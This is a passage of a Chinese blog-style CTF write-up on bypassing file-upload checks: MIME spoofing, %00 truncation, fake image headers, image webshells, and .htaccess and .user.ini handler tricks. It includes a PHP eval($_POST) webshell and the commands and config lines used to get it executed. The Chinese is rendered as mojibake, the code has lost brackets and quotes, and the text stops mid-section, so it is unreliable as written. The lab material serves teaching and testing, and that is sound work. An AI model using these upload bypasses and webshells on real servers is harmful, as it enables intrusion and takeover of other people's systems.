æ­£å¸¸åœ¨urlåé¢è¾“å…¥?file=show.txtheader=show.txttype=text/plainå»è®¿é—®çš„è¯ä¼šç›´æ¥å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œåœ¨hackbaræˆ–è€…bpé‡Œé¢è‡ªå·±è®¿é—®çš„è¯å¹¶ä¸ä¼šï¼Œç„¶åå¦‚æœæˆ‘ä»¬è¾“å…¥?file=show.txtheader=show.txt%0d%0a%0d%0atype=text/plainçš„è¯é¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š ç¬¬ä¸€è¡Œçš„è­¦å‘Šå…¶å®æ¶‰åŠåˆ°äº†phpåº•å±‚çš„cæºç ï¼Œå¦‚ä¸‹ï¼š æˆ‘ä»¬è¯•å›¾å¾€headeré‡Œæ’å…¥\\ræˆ–è€… ï¼Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¸€å¥ç›´æ¥å¤±æ•ˆï¼Œè¿™å…¶å®æ˜¯CRLFçš„å¦ä¸€ç§ç»•è¿‡å§¿åŠ¿ å½“æˆ‘ä»¬è¾“å…¥?file=show.txtheader=show.txt%00type=text/plainæ—¶ï¼Œé¡µé¢å›æ˜¾å¦‚ä¸‹ è¿™ç¬¬ä¸€è¡Œçš„è­¦å‘Šé‡Œé¢ä¹Ÿæ¶‰åŠåˆ°äº†phpçš„åº•å±‚cæºç ï¼Œå¦‚æœæ˜¯%00çš„è¯ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚ä¸‹ ä½†æ˜¯æˆ‘ä»¬è¾“å…¥ ?file=show.txtheader=show.txttype=text/plain%00çš„è¯ï¼Œé¡µé¢å›æ˜¾å¦‚ä¸‹ é‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨typeå¤„è¾“å…¥%00ï¼Œæ˜æ˜åªæ˜¯å½±å“åˆ°Content Typeçš„å€¼ï¼Œå´è¿˜æ˜¯æŠŠContent dispositionç»™å¹²æ‰äº†å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºç¬¬äºŒä¸ªå¼‚å¸¸ï¼Œé€šè¿‡æœç´¢å¾—çŸ¥æŠ›å‡ºç¬¬äºŒä¸ªå¼‚å¸¸æ˜¯å› ä¸ºheaderåœ¨æ‰§è¡Œçš„æ—¶å€™æœ‰ä»»ä½•æ•°æ®è¢«å¸¦åˆ°æµè§ˆå™¨ï¼Œè€Œåœ¨è¿™ä¸€æ•°æ®å°±æ˜¯æŒ‡ç¬¬ä¸€ä¸ªå¼‚å¸¸ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªheaderå¹¶ä¸ä¼šæ‰§è¡Œ åç«¯æ£€æµ‹MIMEæ£€æµ‹ä»€ä¹ˆæ˜¯MIME MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚ å¸¸è§çš„MIMEç±»å‹text/plain ï¼ˆçº¯æ–‡æœ¬ï¼‰ text/html ï¼ˆHTMLæ–‡æ¡£ï¼‰ text/javascript ï¼ˆjsä»£ç ï¼‰ application/xhtml+xml ï¼ˆXHTMLæ–‡æ¡£ï¼‰ image/gif ï¼ˆGIFå›¾åƒï¼‰ image/jpeg ï¼ˆJPEGå›¾åƒï¼‰ image/png ï¼ˆPNGå›¾åƒï¼‰ video/mpeg ï¼ˆMPEGåŠ¨ç”»ï¼‰ application/octet-stream ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰ application/pdf ï¼ˆPDFæ–‡æ¡£ï¼‰ æ£€æµ‹æ–¹å¼åœ¨æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šé’ˆå¯¹æˆ‘ä»¬çš„ä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å…¶ä¸­æœ‰ä¸€é¡¹å°±æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹file_typeï¼›æœåŠ¡ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ£€æµ‹æ—¶ï¼Œå°±æ˜¯é€šè¿‡æ£€æµ‹è„šæœ¬ä¸­çš„é»‘ç™½åå•å’Œè¿™ä¸ªæ•°ç»„ä¸­çš„file_typeè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç¬¦åˆè¦æ±‚å°±å…è®¸ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ã€‚ MIMEç»•è¿‡çš„åŸç†éƒ¨åˆ†Webåº”ç”¨ç³»ç»Ÿåˆ¤å®šæ–‡ä»¶ç±»å‹æ˜¯é€šè¿‡content-typeå­—æ®µï¼Œé»‘å®¢å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œå°†content-typeå­—æ®µæ”¹ä¸ºå¸¸è§çš„å›¾ç‰‡ç±»å‹ï¼Œå¦‚image/gifï¼Œä»è€Œç»•è¿‡æ ¡éªŒã€‚ CTFHub-web-æ–‡ä»¶ä¸Šä¼ -MIMEæ£€æµ‹é¦–å…ˆä¸Šä¼ phpæ–‡ä»¶å¼¹çª—æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œæ£€æŸ¥æºç å‘ç°å¹¶æ²¡æœ‰ç›¸å…³jsä»£ç ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯åç«¯ æ–‡ä»¶ä¸Šä¼ é€”ä¸­è¿›è¡ŒæŠ“åŒ…ï¼Œå°† content-typeå­—æ®µæ”¹ä¸º image/gifï¼Œç„¶åå‘é€è¯·æ±‚åŒ…ï¼Œä¸Šä¼ çš„æ–‡ä»¶ååç¼€ä¸éœ€è¦æ”¹å˜ æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç„¶åå°±å¯ä»¥å¯åŠ¨èšå‰‘äº†ï¼Œèšå‰‘çš„å¯†ç ä¸º$_POSTé‡Œé¢çš„å†…å®¹ï¼Œä¸Šä¼ çš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š ?phpeval($_POST[shell]);? 00æˆªæ–­åŸç†è™½ç„¶webåº”ç”¨åšäº†æ ¡éªŒï¼Œä½†æ˜¯ç”±äºæ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„ç”¨æˆ·å¯ä»¥æ§åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦0X00çš„æ–¹å¼æ¥å°†åé¢çš„æ‹¼æ¥çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œå¯¼è‡´åé¢çš„å†…å®¹æ— æ•ˆï¼Œè€Œä¸”åé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ã€‚ æ¡ä»¶ - phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜ - PHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ - ç”¨æˆ·å¯æŒ‡å®šä¸Šä¼ è·¯å¾„å¹¶ä¸”ä¸Šä¼ è·¯å¾„é€šè¿‡GETæ–¹å¼ä¼ å‚ ç»•è¿‡æ€è·¯åœ¨Cè¯­è¨€ä¸­ï¼Œç©ºå­—ç¬¦æœ‰ä¸€ä¸ªç‰¹æ®Šå«ä¹‰ï¼Œä»£è¡¨å­—ç¬¦ä¸²çš„æ‹¼æ¥ç»“æŸã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯phpè¯­è¨€ï¼Œå±äºé«˜çº§è¯­è¨€ï¼Œåº•å±‚é Cè¯­è¨€æ¥å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç©ºå­—ç¬¦çš„å­—ç¬¦ä¸²æ‹¼æ¥ç»“æŸåŠŸèƒ½åœ¨PHPä¸­ä¹Ÿèƒ½å®ç°ã€‚ä½†æ˜¯æˆ‘ä»¬åœ¨URLä¸­ä¸èƒ½ç›´æ¥ä½¿ç”¨ç©ºï¼Œè¿™æ ·ä¼šé€ æˆæ— æ³•è¯†åˆ«ï¼›æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹ASCIIå¯¹ç…§è¡¨ï¼Œå‘ç°ASCIIå¯¹ç…§è¡¨ç¬¬ä¸€ä¸ªå°±ç©ºå­—ç¬¦ï¼Œå®ƒå¯¹åº”çš„16è¿›åˆ¶æ˜¯00ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨16è¿›åˆ¶çš„00æ¥ä»£æ›¿ç©ºå­—ç¬¦ï¼Œè®©å®ƒæˆªæ–­åé¢çš„å†…å®¹ã€‚ ä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…ï¼Œå› ä¸ºè¿™é‡Œæ˜¯é€šè¿‡URLè¿›è¡Œä¼ é€’çš„æ–‡ä»¶ä¸Šä¼ åå­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥éœ€è¦å¯¹16è¿›åˆ¶çš„00è¿›è¡ŒURLç¼–ç ï¼Œç¼–ç çš„ç»“æœå°±æ˜¯%00ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œå°±å¯ä»¥%00æˆªæ–­åé¢çš„å†…å®¹ï¼Œè®©æ‹¼æ¥çš„æ–‡ä»¶åä¸å†è¿›è¡Œç”Ÿæ•ˆ é¢˜ç›®é¦–å…ˆæŸ¥çœ‹ç›¸å…³æºç ï¼š if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $info = pathinfo($name); $ext = $info[extension]; //é¦–å…ˆå–åˆ°ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å$ext $whitelist = array(jpg, png, gif); //å°†æ‰©å±•åä¸ç™½åå•è¿›è¡ŒåŒ¹é…ï¼Œä¸ºjpgã€pngæˆ–gifæ‰èƒ½é€šè¿‡ç¬¬ä¸€æ¬¡è¿‡æ»¤ if (in_array($ext, $whitelist)) $des = $_GET[road] . / . rand(10, 99) . date(YmdHis) . . . $ext; //æ‰©å±•ååŒ¹é…ä¹‹åï¼Œä¸ºä¸Šä¼ çš„æ–‡ä»¶æ„é€ äº†ä¸€ä¸ªæ–°çš„å­˜å‚¨è·¯å¾„$des if (move_uploaded_file($_FILES[file][tmp_name], $des)) echo scriptalert(ä¸Šä¼ æˆåŠŸ)/script; else echo scriptalert(ä¸Šä¼ å¤±è´¥)/script; else echo æ–‡ä»¶ç±»å‹ä¸åŒ¹é…; in_array($ext, $whitelist)ï¼šin_array($ext, $whitelist) æ˜¯ PHP ä¸­ç”¨äºæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦å­˜åœ¨äºæ•°ç»„ä¸­çš„å‡½æ•°ã€‚$ext æ˜¯è¦æ£€æŸ¥çš„å€¼ï¼Œ$whitelist æ˜¯è¦æ£€æŸ¥çš„æ•°ç»„ã€‚å¦‚æœ $ext å­˜åœ¨äº $whitelist æ•°ç»„ä¸­ï¼Œåˆ™è¯¥å‡½æ•°è¿”å› trueï¼›å¦åˆ™è¿”å› false move_uploaded_file($_FILES[file][tmp_name], $des)ï¼š move_uploaded_file(): è¿™æ˜¯ PHP ä¸­ç”¨äºå°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®çš„å‡½æ•°ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šæºæ–‡ä»¶è·¯å¾„å’Œç›®æ ‡æ–‡ä»¶è·¯å¾„ã€‚ $_FILES[file][tmp_name]: è¿™æ˜¯ä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚åœ¨ PHP ä¸­ï¼Œé€šè¿‡ $_FILES è¶…å…¨å±€å˜é‡å¯ä»¥è®¿é—®åˆ°ä¸Šä¼ çš„æ–‡ä»¶ä¿¡æ¯ï¼Œå…¶ä¸­ file æ˜¯è¡¨å•ä¸­ input type=file æ§ä»¶çš„ name å±æ€§å€¼ï¼Œtmp_name è¡¨ç¤ºä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚ $des: è¿™æ˜¯ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„ï¼Œæ˜¯ä¹‹å‰ä»£ç ä¸­ç”Ÿæˆçš„æ–‡ä»¶è·¯å¾„ã€‚å®ƒæ˜¯ç›®æ ‡ä½ç½®ï¼Œä¸Šä¼ çš„æ–‡ä»¶å°†è¢«ç§»åŠ¨åˆ°è¿™ä¸ªä½ç½®ã€‚ æ ¹æ®ä¸Šé¢çš„ä»£ç æ€è·¯ï¼Œé¦–å…ˆæˆ‘ä»¬æŠŠæ–‡ä»¶åç¼€åæ”¹ä¸ºjpgå½¢å¼ï¼Œç„¶åç”¨bpæŠ“ä¸ªåŒ…ç„¶åä¿®æ”¹getä¼ å‚ä¸­çš„roadå€¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ä¸Šä¼ æˆåŠŸï¼Œä½¿ç”¨èšå‰‘è·å–åˆ°flag POSTä¼ å‚ä¿å­˜è·¯å¾„ä¸GETä¼ å‚ç±»ä¼¼çš„çš„æ˜¯ï¼šåç«¯å¯¹æ–‡ä»¶è·¯å¾„çš„å¤„ç†ç±»ä¼¼ä¸º PHP$des = $_POST[road] . /å¯¹æ–‡ä»¶åçš„å¤„ç†æ“ä½œ...... . $ext; æ­¤æ—¶roadä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œä½†ä¸GETä¼ å‚ä¸åŒçš„æ˜¯ï¼Œhttpè¯·æ±‚å†…åŒ…å«æ–‡ä»¶æ—¶ï¼ŒPOSTå‚æ•°ä¸å†è¢«è‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥POSTä¼ å‚éœ€è¦ä½¿ç”¨BPä½¿ç”¨æŸ¥çœ‹16è¿›åˆ¶çš„è¯·æ±‚è¯¦æƒ…ï¼Œä¿®æ”¹ä¸€ä¸ªåå…­è¿›åˆ¶çš„ä¸º00 æ­¥éª¤ä¸€ï¼šä¿®æ”¹è·¯å¾„æ·»åŠ æ–‡ä»¶åï¼Œå†™å…¥éœ€è¦æ‰§è¡Œçš„ä»£ç è¯­å¥ æ­¥éª¤äºŒï¼šåˆ‡æ¢ä¸ºåå…­è¿›åˆ¶æ¨¡å¼ï¼Œä¿®æ”¹æ‰€éœ€è¦æ›¿æ¢ä¸º00çš„ä½ç½® ç”±äºä½¿ç”¨00æˆªæ–­ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶ä¿å­˜åœ¨/var/www/html/upload,åä¸ºtest.php,æ ¹æ®ä½ç½®ï¼Œè®¿é—®/upload/test.php,å³è¿›å…¥æˆ‘ä»¬æ‰€åœ¨çš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°PHPçš„é…ç½®ä¿¡æ¯ï¼Œ00æˆªæ–­æˆåŠŸ æ–‡ä»¶å¤´æ£€æµ‹æ¼æ´åŸç†åœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ï¼ˆåŒ…æ‹¬å›¾ç‰‡ï¼Œè§†é¢‘æˆ–å…¶ä»–çš„éASCIIæ–‡ä»¶ï¼‰çš„å¼€å¤´ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰å®é™…ä¸Šéƒ½æœ‰ä¸€ç‰‡åŒºåŸŸæ¥æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å®é™…ç”¨æ³•ï¼Œè¿™å°±æ˜¯æ–‡ä»¶å¤´æ ‡å¿—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶ï¼Œæ·»åŠ æœåŠ¡å™¨å…è®¸çš„æ–‡ä»¶å¤´ä»¥ç»•è¿‡æ£€æµ‹ã€‚ å¦ä¸€ç§æ–¹æ³•å°±æ˜¯ç”¨ç”»å›¾è½¯ä»¶ç”»ä¸€å¼ ç®€å•çš„å›¾ï¼Œå¤ªå¤æ‚çš„è¯ä¼šæŠ¥é”™ï¼Œç„¶åæŠ“åŒ…åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ phpä»£ç  å¸¸è§çš„æ–‡ä»¶å¤´æ³¨æ„ï¼šä¸‹é¢çš„æ–‡ä»¶å¤´çš„æ ¼å¼æ˜¯16è¿›åˆ¶çš„æ ¼å¼ï¼š GIFï¼š47 49 46 38 39 61 pngï¼š89 50 4E 47 0D 0A 1A 0A JPGï¼šFF D8 FF E0 00 10 4A 46 49 46 åœ¨è¿›è¡Œæ–‡ä»¶å¤´ç»•è¿‡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢çš„æ–‡ä»¶å¤´æ·»åŠ åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å†…å®¹æœ€å‰é¢ï¼Œè¾¾åˆ°ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹çš„ç›®çš„ CTFHub æ–‡ä»¶ä¸Šä¼  - æ–‡ä»¶å¤´æ£€æµ‹æœ€å¼€å§‹ä¸Šä¼ ä¸€ä¸ª.phpåç¼€çš„æ–‡ä»¶ï¼Œæäº¤ï¼Œalert()å¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œåªå…è®¸jpg,png,gifåç¼€æäº¤ï¼Œç„¶åburpsuiteæŠ“åŒ…ï¼ŒæŠŠContent-typeæ”¹ä¸ºimagepngï¼Œç„¶åå‘ç°è¿˜æ˜¯ä¸Šä¼ ä¸ä¸Šå»ï¼Œæœ‰å¼¹çª—ï¼Œå‘ç°æœ‰æ–‡ä»¶å¤´æ£€æµ‹ é¦–å…ˆç”¨ç”»å›¾å·¥å…·åšå‡ºä¸€ä¸ªæœ€ç®€å•çš„å›¾ï¼Œå¤ªå¤æ‚çš„è¯ä¼šæŠ¥é”™ï¼Œç„¶åä¸Šä¼ ï¼Œä¸­é€”æŠ“åŒ…ä¿®æ”¹æ•°æ®å¦‚ä¸‹ï¼š æŠ¥å¤´ä¸­çš„æ–‡ä»¶åç¼€åè¦æ”¹å› phpï¼Œç„¶åå‘é€è¯·æ±‚åŒ…ï¼ŒæˆåŠŸ ä¹‹ååˆ©ç”¨èšå‰‘è·å–åˆ°flag å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡æ¼æ´åŸç†ä¸€èˆ¬æ–‡ä»¶å†…å®¹éªŒè¯ä½¿ç”¨getimagesizeå‡½æ•°æ£€æµ‹,ä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶å›¾ç‰‡,å¦‚æœæ˜¯,åˆ™å…è®¸ä¸Šä¼ ,å¦åˆ™çš„è¯ä¸å…è®¸ä¸Šä¼ ã€‚ æœ¬å®éªŒå°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ä¸€ä¸ª[åˆæ³•]çš„å›¾ç‰‡æ–‡ä»¶å½“ä¸­,ç„¶åç”¨webshellç®¡ç†å·¥å…·ï¼ˆæ¯”å¦‚èšå‰‘ï¼‰è¿›è¡Œè¿œç¨‹è¿æ¥ã€‚ å›¾ç‰‡é©¬åˆ¶ä½œå‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œè¿™é‡Œä¸ºa.pngï¼Œå’Œä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤åˆæˆä¸€ä¸ªå›¾ç‰‡é©¬3.jpgï¼š a.phpå†…å®¹ï¼š ?php phpinfo(); ? å‘½ä»¤ï¼ˆç”¨cmdï¼Œåœ¨æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼‰ï¼š copy a.png /b + a.php /a 3.jpg /b:æŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ï¼Œç”¨äºå›¾åƒæˆ–è€…å£°éŸ³ç±»æ–‡ä»¶/a:æŒ‡å®šä»¥asciiæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ç”¨äºtxtç­‰æ–‡æœ¬ç±»æ–‡ä»¶ æ³¨ï¼šè¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯ï¼šé€šè¿‡copyå‘½ä»¤ï¼ŒæŠŠa.pngå›¾ç‰‡æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ·»åŠ åˆ°a.phpæ–‡ä»¶ä¸­ï¼Œä»¥ASCIIæ–‡æœ¬æ–‡ä»¶å½¢å¼è¾“å‡ºä¸º3.jpgæ–‡ä»¶ã€‚ è§£æå›¾ç‰‡é©¬ä¸€èˆ¬è§£æå›¾ç‰‡é©¬éœ€è¦ç»“åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«æ‰èƒ½è§£æå›¾ç‰‡é©¬ å¸¸è§æ¼æ´.htaccessæ–‡ä»¶è§£ææ¼æ´ä»€ä¹ˆæ˜¯.htaccessæ–‡ä»¶htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ æ¼æ´åˆ©ç”¨å‰æ webå…·ä½“åº”ç”¨æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼ŒåŒæ—¶webæœåŠ¡å™¨æä¾›å•†å…è®¸ç”¨æˆ·ä¸Šä¼ è‡ªå®šä¹‰çš„.htaccessæ–‡ä»¶ã€‚ åŸç† .htaccessæ–‡ä»¶(æˆ–è€…åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶) ,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œå³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ åˆ©ç”¨æ–¹å¼ä¸€èˆ¬.htaccesså¯ä»¥ç”¨æ¥ç•™åé—¨å’Œé’ˆå¯¹é»‘åå•ç»•è¿‡ ä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦æœ‰è„šæœ¬æœ¨é©¬çš„å›¾ç‰‡ä»¥è„šæœ¬æ–¹å¼è§£æã€‚ .htaccessæ–‡ä»¶å†…å®¹.htaccessæ–‡ä»¶è§£æè§„åˆ™çš„å¢åŠ ï¼Œæ˜¯å¯ä»¥æŒ‰ç…§ç»„åˆçš„æ–¹å¼å»åšçš„ï¼Œä¸è¿‡å…·ä½“å¾—è‡ªå·±å¤šæµ‹è¯•ã€‚ FilesMatch evil.gifSetHandler application/x-httpd-php #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡ŒAddHandler php5-script .gif #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ/FilesMatch æˆ–è€…æ˜¯ä»¥ä¸‹å†…å®¹ AddType application/x-httpd-php .txt è¿™æ®µ Apache é…ç½®è¯­æ³•ç”¨äºå°†æŒ‡å®šæ‰©å±•åçš„æ–‡ä»¶ç±»å‹è®¾ç½®ä¸º PHP æ–‡ä»¶ç±»å‹ã€‚ AddType: è¿™æ˜¯ Apache é…ç½®æŒ‡ä»¤ï¼Œç”¨äºå°†æ–‡ä»¶æ‰©å±•åå…³è”åˆ°æŒ‡å®šçš„ MIME ç±»å‹ã€‚ application/x-httpd-php: è¿™æ˜¯ MIME ç±»å‹çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤º PHP æ–‡ä»¶ç±»å‹ã€‚ .txt: è¿™æ˜¯è¦å…³è”çš„æ–‡ä»¶æ‰©å±•åï¼Œè¡¨ç¤ºæ–‡æœ¬æ–‡ä»¶ CTFHub æ–‡ä»¶ä¸Šä¼  - htaccessé…ç½®æ–‡ä»¶ .htaccessæ–‡ä»¶æ–‡ä»¶ååªèƒ½æ˜¯è¿™ä¸ªï¼Œä½†æ˜¯åœ¨windowsç³»ç»Ÿä¸­ä¸èƒ½å¤Ÿç›´æ¥è¿™æ ·å‘½åï¼Œæ–‡ä»¶åä¸èƒ½ä¸ºç©ºï¼Œä»ç½‘ä¸Šå‘ç°å¯ä»¥é€šè¿‡å¦ä¸€ç§æ–¹æ³•æ¥ä¿®æ”¹ï¼šå¼€å¯cmdï¼Œåˆ‡æ¢åˆ°æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œç„¶åé€šè¿‡renameç›´æ¥ä¿®æ”¹ï¼šrename 1.htaccess .htaccess .user.iniæ¼æ´php.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨ï¼›è€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ä¸€ä¸ªphp.iniï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥æ„é€ åé—¨å’Œéšè—åé—¨ã€‚ ä½†æ˜¯è¿™ç§æ–¹å¼å…¶å®æ˜¯æœ‰ä¸ªå‰æçš„ï¼Œå› ä¸º.user.iniåªå¯¹ä»–åŒä¸€ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰ä»–åŒç›®å½•ä¸‹æœ‰phpæ–‡ä»¶æ‰å¯ä»¥ã€‚ .user.iniæ–‡ä»¶å†…å®¹ï¼šGIF89a #æ–‡ä»¶æ¬ºéª—å¤´ï¼Œè®©ç³»ç»Ÿè®¤ä¸ºä¸Šä¼ çš„æ˜¯å›¾ç‰‡ auto_prepend_file=5.jpg ctfshow-web153urlä¸Šè¾“å…¥ uploadï¼Œç½‘é¡µæ˜¾ç¤ºäº†nothing hereè¡¨ç¤ºå¯ä»¥ç”¨é…ç½®æ–‡ä»¶ï¼ˆå› ä¸ºuploadç›®å½•ä¸‹æœ‰phpæ–‡ä»¶ï¼‰ ä¸ºäº†åˆ©ç”¨auto_append_fileï¼Œæˆ‘ä»¬é¦–å…ˆä¸Šä¼ .user.iniå†…å®¹ä¸º auto_append_fileâ€œxxxâ€ xxxä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ¥ç€ä¸Šä¼ ä¸€ä¸ªå¸¦æœ¨é©¬çš„å›¾ç‰‡ å› ä¸ºuploadæœ‰index.phpï¼Œæ‰€ä»¥è¿™ä¸ªphpå°±ä¼šæ·»åŠ ä¸€ä¸ªinclude(â€œshell.pngâ€)ï¼Œå°±ä¼šåŒ…å«åˆ°æœ¨é©¬,è¿™æ ·å°±åœ¨æ¯ä¸ªphpæ–‡ä»¶ä¸ŠåŒ…å«äº†æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ æ„é€ ä¸¤ä¸ªæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š .user.ini.pngå†…å®¹ï¼š 